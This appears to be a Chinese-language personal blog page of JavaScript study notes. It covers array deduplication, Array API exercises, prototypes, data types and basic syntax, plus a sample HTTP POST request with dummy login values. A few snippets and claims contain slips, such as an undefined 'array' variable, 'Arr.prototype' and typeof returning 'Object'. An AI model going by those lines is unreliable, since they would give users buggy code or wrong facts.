  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let curryFn = fn.bind( this , param1 , param2 )</span><br><span class="line">curryFn( param3 , param4 )</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="HTTP-POST-请求"><a href="#HTTP-POST-请求" class="headerlink" title="HTTP POST 请求"></a>HTTP POST 请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 POST /path HTTP/1.1</span><br><span class="line">2 Host: passport.baidu.com</span><br><span class="line">2 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class="line">2 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">2 Content-Length: 24</span><br><span class="line">2 Content-Type: application/x-www-form-urlencoded</span><br><span class="line">3</span><br><span class="line">4 username=ff&amp;password=123</span><br></pre></td></tr></table></figure>
<h2 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h2><h4 id="对象键值对法。遍历数组时看对象中是否有-key"><a href="#对象键值对法。遍历数组时看对象中是否有-key" class="headerlink" title="对象键值对法。遍历数组时看对象中是否有 key"></a>对象键值对法。遍历数组时看对象中是否有 key</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function unique(arr)&#123;</span><br><span class="line">     var newArray = []</span><br><span class="line">     var obj = &#123;&#125;</span><br><span class="line">     for( var i = 0, len = arr.length; i &lt; len; i++ )&#123;</span><br><span class="line">         if( !obj[ arr[ i ] ] )&#123;</span><br><span class="line">             obj[ arr[ i ] ] = 1</span><br><span class="line">             newArray.push( arr[ i ] )</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return newArray</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Set-对象"><a href="#Set-对象" class="headerlink" title="Set 对象"></a>Set 对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function unique(arr)&#123;</span><br><span class="line">    return newArr = Array.from(new Set(arr))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数组下标判断。遍历数组是看相应值的下标是否和索引相同"><a href="#数组下标判断。遍历数组是看相应值的下标是否和索引相同" class="headerlink" title="数组下标判断。遍历数组是看相应值的下标是否和索引相同"></a>数组下标判断。遍历数组是看相应值的下标是否和索引相同</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function unique(arr)&#123;</span><br><span class="line">     let newArray = []</span><br><span class="line">     arr.forEach( (value,index) =&gt; &#123;</span><br><span class="line">         if( array.indexOf( value ) === index )&#123;</span><br><span class="line">             newArray.push( value )</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; )</span><br><span class="line">     return newArray</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="遍历数组法。遍历数组时看新数组中有没有该值"><a href="#遍历数组法。遍历数组时看新数组中有没有该值" class="headerlink" title="遍历数组法。遍历数组时看新数组中有没有该值"></a>遍历数组法。遍历数组时看新数组中有没有该值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function unique(arr)&#123;</span><br><span class="line">     let newArray = []</span><br><span class="line">     arr.forEach( (value,index) =&gt; &#123;</span><br><span class="line">         if( !newArray.includes( value ) )&#123;</span><br><span class="line">             newArray.push( value )</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; )</span><br><span class="line">     return newArray</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/总结/">总结</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-30T01:02:22.000Z"><a href="/2018/01/30/JS系列 -- Array-浅析之相关-API/">2018-01-30</a></time>
      
      
  
    <h1 class="title"><a href="/2018/01/30/JS系列 -- Array-浅析之相关-API/">JS系列 -- Array 浅析之相关 API</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="判断数组"><a href="#判断数组" class="headerlink" title="判断数组"></a>判断数组</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array.isArray( arguments )</span><br></pre></td></tr></table></figure>
<h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><p><strong>实例化对象的 <code>__proto__</code> 指向构造函数的 <code>prototype</code></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typeof Array === &apos;function&apos;</span><br><span class="line"></span><br><span class="line">Array instanceof Function === true</span><br><span class="line">Array.__proto__ === Function.prototype</span><br><span class="line"></span><br><span class="line">Array instanceof Object === true</span><br><span class="line">Array.__proto__.__proto__ === Object.prototype </span><br><span class="line"></span><br><span class="line">let arr = []</span><br><span class="line">arr.__proto__ === Arr.prototype</span><br><span class="line">arr.__proto__.__proto__ === Object.prototype</span><br><span class="line">arr.__proto__.constructor === Array</span><br></pre></td></tr></table></figure></p>
<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><h4 id="需求一"><a href="#需求一" class="headerlink" title="需求一"></a>需求一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let arr1 = [&apos;a&apos;]</span><br><span class="line">let arr2 = [ &apos;b&apos; , &apos;c&apos; ]</span><br><span class="line">数组 arr1 ==&gt; [ &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br><span class="line">数组 arr2 不变</span><br></pre></td></tr></table></figure>
<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. arr1 = arr.concat(arr2)</span><br><span class="line">2. arr2.forEach( (item) =&gt; &#123;arr1.push(item)&#125; )</span><br><span class="line">3. arr1.push( ...arr2 )</span><br><span class="line">4. [].push.apply( arr1, arr2 )</span><br></pre></td></tr></table></figure>
<h4 id="需求二"><a href="#需求二" class="headerlink" title="需求二"></a>需求二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function max()&#123;</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br><span class="line">max(1,2,3) // 3</span><br><span class="line">max( 1,4 ) // 4</span><br></pre></td></tr></table></figure>
<h6 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. return Math.max(...arguments)</span><br><span class="line">2. return Math.max.apply( null, arguments )</span><br></pre></td></tr></table></figure>
<h4 id="需求三"><a href="#需求三" class="headerlink" title="需求三"></a>需求三</h4><p>将 <code>arguments</code> 转化为 <code>Array</code></p>
<h6 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. args = Array.from( arguments )</span><br><span class="line">2. args = [].slice.call( arguments )</span><br></pre></td></tr></table></figure>
<h4 id="需求四"><a href="#需求四" class="headerlink" title="需求四"></a>需求四</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function repeat( str, num )&#123;</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br><span class="line">repeat( &apos;abc&apos;, 3 ) // &apos;abcabcabc&apos;</span><br></pre></td></tr></table></figure>
<h6 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return Array( num + 1 ).join( str )</span><br></pre></td></tr></table></figure>
<h4 id="需求五"><a href="#需求五" class="headerlink" title="需求五"></a>需求五</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr = [ &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br><span class="line">判断 &apos;b&apos; 在不在 arr 里面</span><br></pre></td></tr></table></figure>
<h6 id="解决方法-4"><a href="#解决方法-4" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.indexOf( &apos;b&apos; ) !== -1  // true ==&gt; 在   false ==&gt; 不在</span><br><span class="line">arr.includes( &apos;b&apos; )   // 直接返回 true | false</span><br></pre></td></tr></table></figure>
<h4 id="需求五升级"><a href="#需求五升级" class="headerlink" title="需求五升级"></a>需求五升级</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let arr = [ &#123;name: &apos;xiaoming&apos;&#125;, &#123;name: &apos;xiaozhang&apos;&#125; ]</span><br><span class="line">查看数组中是否有叫小明的人</span><br></pre></td></tr></table></figure>
<h6 id="解决方法-5"><a href="#解决方法-5" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. arr.forEach((item) =&gt; &#123;</span><br><span class="line">	if(item.name === &apos;xiaoming&apos;)&#123;</span><br><span class="line">		console.log(&apos;true&apos;)</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;)</span><br><span class="line">// forEach 方法返回 undefined ，没有想到怎么取得它的结果，目前只能 console.log(&apos;true&apos;)</span><br><span class="line">2. let it = arr.find( (item) =&gt; &#123;</span><br><span class="line">    return item.name === &apos;xiaoming&apos;</span><br><span class="line">  &#125;)</span><br><span class="line">  console.log(it)  // &#123;name: &quot;xiaoming&quot;&#125;</span><br><span class="line">3. let it = arr.findIndex((item) =&gt; &#123;</span><br><span class="line">	return item.name === &apos;xiaoming&apos;</span><br><span class="line">    &#125;)</span><br><span class="line">    console.log(it)  // 0</span><br></pre></td></tr></table></figure>
<h4 id="需求六"><a href="#需求六" class="headerlink" title="需求六"></a>需求六</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let arr = [ 20, 30, 40 ]</span><br><span class="line">使得 arr 中每个元素 +5</span><br><span class="line">arr ==&gt; [ 25, 35, 45 ]</span><br></pre></td></tr></table></figure>
<h6 id="解决方法-6"><a href="#解决方法-6" class="headerlink" title="解决方法"></a>解决方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. arr.map( (item) =&gt; &#123;</span><br><span class="line">    return item + 5</span><br><span class="line">  &#125;)</span><br><span class="line">2. arr.forEach( (item, index, ctx) =&gt; &#123;</span><br><span class="line">    ctx[ index ] = item + 5</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure>
<h4 id="需求七"><a href="#需求七" class="headerlink" title="需求七"></a>需求七</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123; name: &apos;xiaoming&apos;, age: 20, id: 123456789 &#125;</span><br><span class="line">function validPerson( person )&#123;</span><br><span class="line">    // 如果有 名字 | id 就有效</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. if(person.hasOwnProperty( &apos;name&apos; ) || person.hasOwnProperty( &apos;id&apos; ))&#123;</span><br><span class="line">      return true</span><br><span class="line">   &#125;</span><br><span class="line">    return false</span><br><span class="line">2. </span><br><span class="line">let obj = &#123; name: &apos;xiaoming&apos;, age: 20, id: 123456789 &#125;</span><br><span class="line">let validFileds = [ &apos;name&apos;, &apos;id&apos; ]</span><br><span class="line">function validPerson( person )&#123;</span><br><span class="line">    return validFileds.some( (item) =&gt; &#123;</span><br><span class="line">        return person.hasOwnProperty( item )</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">3. </span><br><span class="line">let obj = &#123; name: &apos;xiaoming&apos;, age: 20, id: 123456789 &#125;</span><br><span class="line">let validFileds = [ &apos;name&apos;, &apos;id&apos; ]</span><br><span class="line">function validPerson( person )&#123;</span><br><span class="line">    return validFileds.some( Object.prototype.hasOwnProperty, person )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-30T00:53:32.000Z"><a href="/2018/01/30/JS系列 -- 基本概念（二）数据类型/">2018-01-30</a></time>
      
      
  
    <h1 class="title"><a href="/2018/01/30/JS系列 -- 基本概念（二）数据类型/">JS系列 -- 基本概念（二）数据类型</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ol>
<li>基本数据类型（简单数据类型）：<ul>
<li>数值</li>
<li>字符串</li>
<li>布尔值</li>
<li>undefined</li>
<li>null</li>
<li>Symbol </li>
</ul>
</li>
<li>复杂数据类型：<ul>
<li>Object  ==&gt;  由一组无序的键值对组成，即哈希。分为 <strong>狭义对象</strong> <strong>数组</strong> <strong>函数</strong></li>
</ul>
</li>
<li>原始类型：字符串 数值 布尔值</li>
<li>合成类型：对象</li>
<li>特殊值：undefined null</li>
</ol>
<h1 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h1><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><ol>
<li>typeof 运算符：返回一个值的数据类型(<strong>字符串</strong>)<ul>
<li>“undefined” ==&gt; 如果这个值  <strong>未定义</strong></li>
<li>“boolean” ==&gt; 如果这个值是  <strong>布尔值</strong></li>
<li>“string” ==&gt; 如果这个值是  <strong>字符串</strong></li>
<li>“number” ==&gt; 如果这个值是  <strong>数值</strong></li>
<li>“Object” ==&gt; 如果这个值是   <strong>对象</strong> 或 <strong>null</strong></li>
<li>“function” ==&gt; 如果这个值  <strong>函数</strong></li>
</ul>
</li>
<li>instanceof 运算符</li>
<li>Object.prototype.toString方法</li>
</ol>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol>
<li>没有 Array 类型</li>
<li>对<strong>未初始化</strong>的变量执行 typeof 操作符会返回 undefined 值</li>
<li>对<strong>未声明</strong>的变量执行 typeof 操作符会返回 undefined 值</li>
</ol>
<h1 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h1><h3 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h3><p>非数值，是一个特殊的<strong>数值</strong>（typeof NaN  ==&gt;  number）</p>
<ul>
<li>任何涉及 NaN 的操作都会返回 NaN</li>
<li>NaN 与任何值都不相等，包括 NaN 本身</li>
</ul>
<h3 id="转换类型（3函数-2操作符）"><a href="#转换类型（3函数-2操作符）" class="headerlink" title="转换类型（3函数 2操作符）"></a>转换类型（3函数 2操作符）</h3><ul>
<li><code>Number()</code> ==&gt; 可以用于任何函数</li>
<li><code>parseInt()</code> ==&gt; 用于将字符串转换为数值 <strong><code>parseInt(&quot;&quot;) //NaN</code></strong></li>
<li><code>parseFloat()</code> ==&gt; 用于将字符串转换为数值</li>
<li>一元 <code>+</code> 操作符 ==&gt; 等价于 <code>Number()</code></li>
<li><code>&#39; - 0 &#39;</code>  //任意一个类型减去0</li>
</ul>
<p><strong><code>parseInt(&#39;s&#39;) ==&gt; NaN</code></strong></p>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>字符串默认只能写在一行内，分成多行将会报错。</p>
<ul>
<li>如果长字符串必须分成多行，可以在每一行的尾部使用<strong>反斜杠</strong>。<br><strong>注意</strong>：反斜杠的后面必须是换行符，而不能有其他字符（比如空格），否则会报错。</li>
<li>连接<strong>运算符（+）</strong>可以连接多个单行字符串，将长字符串拆成多行书写，输出的时候也是单行</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>字符串是不可变的，字符串一旦创建，值就不能改变，要改变某个变量保存的字符串，首先要销毁原来的字符串，然后再用另一个包含新值的字符串填充该变量</p>
<h3 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h3><p>返回字符串的长度，该属性也是无法改变的</p>
<h3 id="字符字面量（转义符）"><a href="#字符字面量（转义符）" class="headerlink" title="字符字面量（转义符）"></a>字符字面量（转义符）</h3><p>反斜杠（\）在字符串内有特殊含义，用来表示非打印，所以又称为字符字面量（转义符）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">\0 ：null（\u0000）</span><br><span class="line">\b ：后退键（\u0008）</span><br><span class="line">\f ：换页符（\u000C）</span><br><span class="line">\n ：换行符（\u000A）</span><br><span class="line">\r ：回车键（\u000D）</span><br><span class="line">\t ：制表符（\u0009）</span><br><span class="line">\v ：垂直制表符（\u000B）</span><br><span class="line">\&apos; ：单引号（\u0027）</span><br><span class="line">\&quot; ：双引号（\u0022）</span><br><span class="line">\\ ：反斜杠（\u005C）</span><br></pre></td></tr></table></figure></p>
<p>如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。</p>
<h3 id="字符串与数组"><a href="#字符串与数组" class="headerlink" title="字符串与数组"></a>字符串与数组</h3><p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。<br>无法改变字符串之中的单个字符。</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>转换为字符串</p>
<ol>
<li>一元 + 号操作符   </li>
<li>String()     </li>
<li>toString()</li>
</ol>
<h1 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h1><p> <strong>falsy</strong> ： 在 Boolean 上下文中认定可转换为 false 的值 ( 5个假值 )<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">false</span><br><span class="line">0</span><br><span class="line">NaN</span><br><span class="line">&apos;&apos;</span><br><span class="line">null</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure></p>
<p><strong>空数组（[]）和空对象（{}）对应的布尔值，都是true。</strong></p>
<h3 id="转换类型"><a href="#转换类型" class="headerlink" title="转换类型"></a>转换类型</h3><p>转换为布尔值</p>
<ol>
<li>Boolean()</li>
<li><code>!!</code>    //取反再取反</li>
</ol>
<h1 id="null-和-undefined-区别"><a href="#null-和-undefined-区别" class="headerlink" title="null 和 undefined 区别"></a>null 和 undefined 区别</h1><ul>
<li>null是一个表示<strong>“空”的对象</strong>，转为数值时为0。</li>
<li><p>null表示<strong>空值</strong>，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入null，表示该参数为空。</p>
</li>
<li><p>undefined是一个表示”此处无定义”的原始值，转为数值时为NaN。返回undefined的情景。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 变量声明了，但没有赋值</span><br><span class="line">var i;</span><br><span class="line">i // undefined</span><br><span class="line"></span><br><span class="line">// 调用函数时，应该提供的参数没有提供，该参数等于 undefined</span><br><span class="line">function f(x) &#123;</span><br><span class="line">  return x;</span><br><span class="line">&#125;</span><br><span class="line">f() // undefined</span><br><span class="line"></span><br><span class="line">// 对象没有赋值的属性</span><br><span class="line">var  o = new Object();</span><br><span class="line">o.p // undefined</span><br><span class="line"></span><br><span class="line">// 函数没有返回值时，默认返回 undefined</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">f() // undefined</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-30T00:51:28.000Z"><a href="/2018/01/30/JS系列 -- 基本概念（一）基础/">2018-01-30</a></time>
      
      
  
    <h1 class="title"><a href="/2018/01/30/JS系列 -- 基本概念（一）基础/">JS系列 -- 基本概念（一）基础</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h3 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h3><p>ECMAScript 中的一切（变量 函数名和操作符）都区分大小写</p>
<h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>标识符：标识符（identifier）指的是用来识别各种值的合法名称，变量、函数、属性的名字或者是函数的参数都是标识符</p>
<h5 id="规则："><a href="#规则：" class="headerlink" title="规则："></a>规则：</h5><ul>
<li>第一个字符必须是一个字母、下划线（_）或一个美元符号（$）</li>
<li>其他字符可以是字母、数字、下划线或者美元符号<br><strong>中文是合法的标识符，可以用作变量名。</strong></li>
</ul>
<h3 id="书写格式"><a href="#书写格式" class="headerlink" title="书写格式"></a>书写格式</h3><p>ECMAScript 中标识符 <strong>推荐</strong> 采用 “驼峰大小写（camelCase）” 书写格式。<br>还有 “短横线分隔命名（kebab-case）” 书写格式和 “单词首字母大写（PascalCase）” 书写格式。</p>
<h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。</p>
<ul>
<li>语句（statement）是为了完成某种任务而进行的操作</li>
<li>表达式（expression）：指一个为了得到返回值的计算式。</li>
</ul>
<h5 id="语句和表达式的区别："><a href="#语句和表达式的区别：" class="headerlink" title="语句和表达式的区别："></a>语句和表达式的区别：</h5><ul>
<li>语句主要为了进行某种操作，一般情况下不需要返回值；</li>
<li>表达式则是为了得到返回值，一定会返回一个值。</li>
<li>语句以分号结尾，一个分号就表示一个语句结束。</li>
<li>分号前面可以没有任何内容，JavaScript引擎将其视为空语句。</li>
<li>表达式不需要分号结尾。一旦在表达式后面添加分号，则 JavaScript 引擎就将表达式视为语句，这样会产生一些没有任何意义的语句。</li>
</ul>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 单行注释</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">*这是一个</span><br><span class="line">*多行注释</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  合法的单行注释   --&gt;</span><br></pre></td></tr></table></figure>
<p>在使用编辑器时，快捷键为 <code>Ctrl</code> + <code>?</code></p>
<h3 id="关键字和保留字"><a href="#关键字和保留字" class="headerlink" title="关键字和保留字"></a>关键字和保留字</h3><p>关键字和保留字具有特定的用途，不能用作标识符。</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>ECMAScript 中的变量是松散类型的，所谓松散类型就是可以用来保存任何类型的数据</p>
<h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>定义变量时使用 <code>var</code> 操作符，<strong>用 <code>var</code> 操作符定义的变量将成为定义该变量的作用域中的局部变量</strong>。</p>
<h3 id="套路"><a href="#套路" class="headerlink" title="套路"></a>套路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = // 2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>结果：<code>a = 1</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a = 1</span><br><span class="line">if(a = 3)</span><br><span class="line">    console.log(&apos;a等于3&apos;)</span><br></pre></td></tr></table></figure>
<p>结果：<code>打印出：a等于3</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = </span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>结果：<code>合法，等价于  a = 1</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = /* 2 */</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>结果：<code>a = 1</code></p>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-29T00:26:44.000Z"><a href="/2018/01/29/jQuery系列（四）-- 事件/">2018-01-29</a></time>
      
      
  
